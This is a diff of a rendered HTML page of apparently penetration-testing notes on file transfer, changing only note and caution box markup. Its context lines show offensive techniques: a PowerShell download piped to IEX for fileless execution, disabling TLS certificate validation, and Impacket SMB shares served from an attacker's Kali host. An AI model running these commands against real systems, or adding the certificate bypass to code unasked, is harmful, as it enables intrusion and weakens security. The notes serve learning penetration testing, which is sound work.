@@ -1198,17 +1198,17 @@
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>cat<span class="w"> </span>&lt;File&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span>
 </code></pre></div>
 <h3 id="decode">Decode</h3>
-<blockquote>
-<p>[!caution] Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p>
-</blockquote>
+<div class="admonition warning">
+<p class="admonition-title">Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.</p>
+</div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Windows</span>
 <a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="no">[IO.File]</span><span class="p">::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="s2">"C:\Users\Public\&lt;File_Name&gt;"</span><span class="p">,</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">"&lt;Base64_Output&gt;"</span><span class="p">))</span>
 </code></pre></div>
 <hr>
 <h2 id="powershell">PowerShell</h2>
-<blockquote>
-<p>[!note] Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity.</p>
-</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity.</p>
+</div>
 <table>
 <thead>
 <tr>
@@ -1264,22 +1264,22 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Windows (Piped Fileless Method)</span>
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'https://&lt;File&gt;'</span><span class="p">)</span> <span class="p">|</span> <span class="nb">IEX</span>
 </code></pre></div>
-<blockquote>
-<p>[!caution] Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p>
-</blockquote>
+<div class="admonition warning">
+<p class="admonition-title">Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p>
+</div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
 </code></pre></div>
 <h3 id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest</h3>
-<blockquote>
-<p>[!note] From PowerShell 3.0 onwards, the <code>Invoke-WebRequest</code> cmdlet is also available, but it is noticeably slower at downloading files.</p>
-</blockquote>
+<div class="admonition note">
+<p class="admonition-title">From PowerShell 3.0 onwards, the <code>Invoke-WebRequest</code> cmdlet is also available, but it is noticeably slower at downloading files.</p>
+</div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://&lt;</span><span class="n">File</span><span class="p">&gt;</span> <span class="n">-OutFile</span> <span class="p">&lt;</span><span class="n">File</span><span class="p">&gt;</span>
 </code></pre></div>
 <hr>
 <h2 id="smb">SMB</h2>
-<blockquote>
-<p>[!note] We need to create an SMB server in our Pwnbox with <code>smbserver.py</code> from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.</p>
-</blockquote>
+<div class="admonition note">
+<p class="admonition-title">We need to create an SMB server in our Pwnbox with <code>smbserver.py</code> from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.</p>
+</div>
 <h3 id="start-server">Start Server</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Kali</span>
 <a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare
@@ -1288,9 +1288,9 @@
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Windows</span>
 <a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">copy </span><span class="p">\\&lt;</span><span class="n">Kali_IP</span><span class="p">&gt;\</span><span class="n">share</span><span class="p">\&lt;</span><span class="n">File</span><span class="p">&gt;</span>
 </code></pre></div>
-<blockquote>
-<p>[!caution] New versions of Windows block unauthenticated guest access, as we can see in the following command:</p>
-</blockquote>
+<div class="admonition warning">
+<p class="admonition-title">New versions of Windows block unauthenticated guest access, as we can see in the following command:</p>
+</div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Kali</span>
 <a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-user<span class="w"> </span>&lt;Username&gt;<span class="w"> </span>-password<span class="w"> </span>&lt;Password&gt;
 </code></pre></div>
